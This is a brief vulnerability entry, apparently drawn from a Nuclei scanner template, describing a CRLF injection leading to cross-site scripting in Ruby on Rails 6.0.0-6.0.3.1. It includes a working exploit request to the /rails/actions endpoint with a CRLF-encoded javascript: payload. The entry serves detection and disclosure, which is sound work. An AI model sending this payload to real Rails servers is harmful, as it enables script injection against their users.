# Vulnerability: Ruby on Rails - CRLF Injection and Cross-Site Scripting
**Classification:** CWE-79,CWE-113
**Source:** Nuclei Template (`rails6-xss.yaml`)

## Description
Ruby on Rails 6.0.0-6.0.3.1 contains a CRLF issue which allows JavaScript to be injected into the response, resulting in cross-site scripting.

## Vulnerable Code Pattern / Exploit Payload
```http
POST {{BaseURL}}/rails/actions?error=ActiveRecord::PendingMigrationError&action=Run%20pending%20migrations&location=%0djavascript:alert(1)//%0aaaaaa
```

